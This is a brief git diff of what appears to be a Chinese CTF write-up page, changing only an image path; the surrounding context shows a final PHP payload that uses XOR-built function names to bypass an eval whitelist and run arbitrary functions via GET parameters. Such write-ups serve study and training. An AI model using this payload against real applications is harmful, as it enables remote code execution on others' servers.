@@ -104,6 +104,6 @@ foreach($whitelist as $w){
 }
 ```
 
-![](<../.gitbook/assets/image (19) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (19) (1) (1) (1) (1) (1).png>)
 
 最终 payload: `?c=$pi=${(hexdec^decoct(31737))};$pi{pow}($pi{abs});`
